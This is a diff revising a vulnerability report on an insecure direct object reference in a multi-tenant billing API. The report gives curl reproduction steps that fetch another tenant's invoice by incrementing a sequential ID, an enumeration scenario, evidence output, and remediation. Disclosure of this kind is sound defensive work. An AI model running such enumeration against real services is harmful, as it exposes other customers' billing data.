@@ -18,30 +18,24 @@ A customer of the billing platform reads any other tenant's invoice PDF by chang
 
 ### Steps to Reproduce
 
-1. Log in as a normal customer (Tenant A) and open any invoice to capture its ID, e.g. `41207`.
-2. Request the tenant's own invoice as a control:
+1. [attacker] Log in as a normal customer (Tenant A) and open any invoice to capture its ID, e.g. `41207`.
+2. [attacker] Request the tenant's own invoice as a control:
 ```
 curl -s -H "Authorization: Bearer $TENANT_A_TOKEN" \
   https://billing.example.com/api/v2/invoices/41207/pdf -o own-invoice.pdf
 ```
-3. Request an adjacent ID outside the sequence the UI ever shows Tenant A:
+**Expect:** 200, Tenant A's own invoice.
+3. [attacker] Request an adjacent ID outside the sequence the UI ever shows Tenant A:
 ```
 curl -s -H "Authorization: Bearer $TENANT_A_TOKEN" \
   https://billing.example.com/api/v2/invoices/41198/pdf -o other-invoice.pdf
 ```
-4. `other-invoice.pdf` opens and shows a different company name, billing address, and line items — Tenant A never had access to this account.
+**Expect:** 200, but `other-invoice.pdf` is a different company's invoice — Tenant A never had access to this account.
 
 ### Evidence
 
+**Cross-tenant read.** Step 3's downloaded PDF, rendered to text:
 ```
-$ curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TENANT_A_TOKEN" \
-    https://billing.example.com/api/v2/invoices/41207/pdf
-200                                                              <-- control: own invoice, expected 200
-
-$ curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TENANT_A_TOKEN" \
-    https://billing.example.com/api/v2/invoices/41198/pdf
-200                                                              <-- exploit: someone else's invoice, still 200
-
 $ pdftotext other-invoice.pdf - | head -5
 Northwind Fixtures LLC                                           <-- not Tenant A's company
 Invoice #41198  —  Due 2026-06-30
@@ -50,9 +44,13 @@ Line 1: Annual platform license — $18,400.00                    <-- proof of c
 Line 2: Overage — API calls (Q2)  — $2,150.00
 ```
 
+**Identifier enumerability.** Tenant A's own invoice is `41207`; `41198` belongs to another company. The IDs are sequential integers from one platform-wide range, not a per-tenant sequence. An attacker walks the range rather than guessing it.
+
+**Minimum privilege.** Both requests used an ordinary paid customer session. No admin, billing-manager, or support permission was held or needed.
+
 ### Attack Scenario
 
-A competitor or disgruntled customer, working from an ordinary paid account with no elevated role, enumerates the invoice ID space sequentially from their own known IDs. Each request for an ID outside their own range returns another tenant's invoice PDF with company name, billing contact, and full line-item pricing.
+A competitor or disgruntled customer works from an ordinary paid account with no elevated role. They enumerate the invoice ID space sequentially from their own known IDs. Each request for an ID outside their own range returns another tenant's invoice PDF with company name, billing contact, and full line-item pricing.
 
 ### Impact
 
@@ -60,4 +58,4 @@ Every tenant's billing data — contact details and negotiated line-item pricing
 
 ### Remediation
 
-Scope the invoice lookup by tenant ID in the query — add a `WHERE tenant_id = :caller_tenant_id` check (or equivalent ownership check in the invoice service) before the PDF is generated, not after. Switch the invoice identifier in the URL to a per-tenant opaque token or UUID as defense-in-depth so an ownership-check regression doesn't reopen an enumerable ID space.
+Scope the invoice lookup by tenant ID in the query. Add a `WHERE tenant_id = :caller_tenant_id` check, or an equivalent ownership check in the invoice service, before the PDF is generated, not after. Switch the invoice identifier to a per-tenant opaque token or UUID as defense-in-depth, so an ownership-check regression can't reopen an enumerable ID space.
